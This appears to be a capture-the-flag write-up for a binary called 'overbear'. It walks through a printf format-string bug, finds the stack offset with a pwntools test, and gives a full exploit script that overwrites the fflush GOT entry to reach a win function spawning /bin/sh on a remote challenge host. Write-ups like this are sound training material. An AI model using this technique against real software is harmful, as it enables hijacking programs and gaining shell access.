<img width="625" height="297" alt="image" src="https://github.com/user-attachments/assets/7bbf1c40-a6b5-439c-abff-4e15e91da7df" /><img width="1867" height="535" alt="image" src="https://github.com/user-attachments/assets/f6654b90-666e-4127-a8b3-98545d6fe130" /><img width="595" height="512" alt="image" src="https://github.com/user-attachments/assets/d49b3915-b2b1-4dd7-aa20-574712ea961b" />

#### Reconnaissance and Security Properties

We start by analyzing the binary's properties and security mitigations.

#### File Type Identification

To verify the architecture of the binary:

<img width="1910" height="92" alt="image" src="https://github.com/user-attachments/assets/51632796-f94f-4d02-8b87-9edd3fae708c" />


#### Security Mitigations

To inspect checking security properties such as Canary, NX, PIE, and RELRO:

<img width="1531" height="100" alt="image" src="https://github.com/user-attachments/assets/62c2477d-0207-43c7-8046-736a3b6005da" />


- **Partial RELRO**: The `.got.plt` section remains writable after dynamic linking.
- **NX disabled**: Stack/memory pages can be executable, but stack buffer overflow is not required.
- **No Canary / No PIE**: Text and GOT addresses are fixed and static.

---

#### Reverse Engineering

#### Symbols Analysis

To inspect the functions defined in the executable:

<img width="486" height="677" alt="image" src="https://github.com/user-attachments/assets/75c80b81-a752-4cb5-892c-859f6d4f54b1" />


Important symbols identified:

- `00000000004011f6 T setup`
- `000000000040125b T win`
- `000000000040128b T vuln`
- `0000000000401307 T main`

#### Disassembling the Binary

To disassemble the text section of the binary:

```bash
objdump -M intel -d overbear
```

Key findings from disassembly:

- **`win`** (`0x40125b`):
    - Calls `puts` with `FlagBOT: *sigh* Not again :'(`.
    - Calls `system("/bin/sh")`.
    - Exits.
    
<img width="827" height="196" alt="image" src="https://github.com/user-attachments/assets/cae42810-b692-4a9f-94d4-bf1750ee2a97" />

    
- **`vuln`** (`0x40128b`):
    - Allocates `0x100` (256) bytes for a buffer on the stack (`rbp-0x100`).
    - Reads input: `read(0, rbp-0x100, 0xff)` (up to 255 bytes).
    - Explicitly null-terminates the string at the last byte: `mov BYTE PTR [rbp-0x1], 0x0`.
    - Prints the buffer directly using: `printf(rbp-0x100)` -> **Format String Vulnerability**.
    - Calls `fflush(stdout)`.
    
<img width="912" height="497" alt="image" src="https://github.com/user-attachments/assets/d83a57c5-efe1-4258-9833-4a67ac48eca5" />

    

#### Relocations / GOT Entry Identification

To identify the address of `fflush` inside the Global Offset Table:

<img width="535" height="317" alt="image" src="https://github.com/user-attachments/assets/45382379-4f34-4168-8e13-27add0cadb37" />


Thus, the GOT entry for `fflush` resides at the fixed address `0x404038`.

---

#### Vulnerability Exploitation

#### Offset Discovery

To identify where our input buffer resides relative to `printf`'s arguments, we run a short test locally:

1. Ensure the binary has executable permissions:
    
    ```bash
    chmod +x overbear
    ```
    
2. Send format specifiers to inspect the stack parameters:
    
    ```python
    # test_offset.py
    from pwn import *
    p = process('./overbear')
    p.recvuntil(b'You    : ')
    p.sendline(b'AAAAAAAABBBBBBBB.%6$p.%7$p')
    print(p.recvall())
    ```
    
    Running the test script:
    
<img width="625" height="297" alt="image" src="https://github.com/user-attachments/assets/e1a86bb6-951f-4ebb-a962-db4453a5b952" />

    
    *Output:*`b'AAAAAAAABBBBBBBB.0x4141414141414141.0x4242424242424242\n'`
    
    This confirms that:
    
    - `%6$p` corresponds to the first 8 bytes of our buffer (`[rsp]`).
    - `%7$p` corresponds to the next 8 bytes (`[rsp+8]`).
    - `%8$p` corresponds to the bytes starting at offset 16 (`[rsp+16]`).

#### Target Write Mechanics

- Target address to write: `0x404038` (`fflush@got`).
- Target value to write: `0x40125b` (`win`).
- Since `fflush@got` originally points to `0x4010e6`, we only need to modify the lower 2 bytes (`0x10e6` -> `0x125b`).
- `0x125b` in decimal is `4699`.

#### Format String Construction

We pad our format string to exactly 16 bytes so that our target address `0x404038` sits at offset 8 (`%8$hn`):

- `%4699c` prints 4699 characters.
- `%8$hn` writes the printed character count (`0x125b`) to the address in the 8th argument.
- `AAAAA` (5 bytes) pads the format string to exactly 16 bytes.
- The address `\x38\x40\x40\x00\x00\x00\x00\x00` is appended, placing it at byte offset 16 (index 8).

---

#### Execution

#### Local Exploitation Test (via GDB)

To debug and verify the write before running it remotely, we generate the binary payload and feed it directly into GDB:

<img width="1867" height="535" alt="image" src="https://github.com/user-attachments/assets/e1a31dfb-062e-431e-acb5-62508b7c8e4d" />


This confirms we successfully redirected execution to `win`.

#### Remote Exploit Script

Here is the final exploit script (`exploit.py`):

```python
from pwn import *

context.binary = elf = ELF('./overbear')

# Target address and value
target_addr = 0x404038 # fflush@got
win_addr = 0x40125b    # win

# Connection setup
if args.REMOTE:
    p = remote('34.143.189.39', 10177)
else:
    p = process('./overbear')

# Format string payload
payload = b"%4699c%8$hnAAAAA" + p64(target_addr)

p.recvuntil(b'You    : ')
p.sendline(payload)

p.interactive()
```

Run the script against the remote instance:

```bash
python3 exploit.py REMOTE=1
```

Once interactive mode is reached, spawn a shell and print the flag:

<img width="565" height="132" alt="image" src="https://github.com/user-attachments/assets/fc681b05-a607-4612-9099-21ca8706ef0e" />

**Flag**: `HNYX{S1mpl3_0verR1d3_g0_bRRRRRR}`
